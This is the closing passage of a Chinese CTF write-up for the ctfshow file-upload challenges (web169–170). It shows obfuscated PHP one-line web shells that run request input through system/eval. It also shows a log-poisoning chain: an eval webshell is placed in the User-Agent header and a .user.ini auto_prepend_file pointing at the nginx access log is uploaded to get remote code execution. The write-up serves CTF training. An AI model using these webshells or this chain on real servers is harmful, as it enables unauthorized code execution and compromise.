</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>再如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="s1">&#39;1s&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;ystem&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728121442185.png" title="image-20230728121442185" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728121442185.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728121442185.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728121442185.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728121442185.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230728121442185.png 2x"
            sizes="auto"
            alt="image-20230728121442185">
    </a></figure></p>
<h3 id="web169" class="headerLink">
    <a href="#web169" class="header-mark"></a>[web169]</h3><p>过滤了<code>&lt;</code>，无法执行PHP代码，于是考虑<strong>日志包含</strong></p>
<p>前端限制必须上传zip，且<code>file_content</code>需修改为<code>image/png</code></p>
<p>同时在<code>user-agent</code>中写入一句话木马，<code>&lt;?php eval（$_POST['cmd']);?&gt;</code></p>
<p>随后上传一个<code>.user.ini</code>文件，<code>auto_prepend_file=/var/log/nginx/access.log</code></p>
<p>再上传一个<code>1.php</code>文件，内容随便写，因为<code>url/upload/</code>目录下没有文件，所以需要写一个文件来承接<code>.user.ini</code></p>
<p>接着就可以访问<code>/url/upload/1.php</code>，然后rce或者用蚁剑连接</p>
<h3 id="web170" class="headerLink">
    <a href="#web170" class="header-mark"></a>[web170]</h3><p>题解同上</p></div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-11-17</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"><span><a class="link-to-mardown" href=/ctfshow_file_upload/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\ctfshow_file_upload.md target="_blank" rel="noopener noreferrer">View source</a>
                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\ctfshow_file_upload.md target="_blank" rel="noopener noreferrer">Edit this page</a>
                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20ctfshow_file_upload&body=|Field|Value|%0A|-|-|%0A|Title|ctfshow_file_upload|%0A|Url|http://scofield1920.github.io/ctfshow_file_upload/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\ctfshow_file_upload.md| target="_blank" rel="noopener noreferrer">Report issue</a>
                    </span></div>
            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/ctfshow_file_upload/" data-title="ctfshow_file_upload" data-hashtags="CTF,web"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/ctfshow_file_upload/" data-hashtag="CTF"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/ctfshow_file_upload/" data-title="ctfshow_file_upload"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/ctfshow_file_upload/" data-title="ctfshow_file_upload"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/ctfshow_file_upload/" data-title="ctfshow_file_upload"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/ctfshow_file_upload/" data-title="ctfshow_file_upload" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
        function shareOnMastodon(title, link) {
            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
            const domain = prompt("Enter your Mastodon domain", savedDomain);
            if (domain === null) {
                return;
            }
            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
            const text = title + "\n\n" + link;
            const url = new URL("https://" + domain)
            url.pathname = "share"
            url.searchParams.append('text', text)
            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
        }
    </script>
    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;ctfshow_file_upload&#34;, &#34;http://scofield1920.github.io/ctfshow_file_upload/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/ctfshow_rce/" class="prev" rel="prev" title="ctfshow_rce"><i class="fas fa-angle-left fa-fw"></i>ctfshow_rce</a>
            <a href="/ctfshow_file_include/" class="next" rel="next" title="ctfshow_file_include">ctfshow_file_include<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="utterances"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Scfie1d-Blog","mobile-header-typeit":"Scfie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
</body>

</html>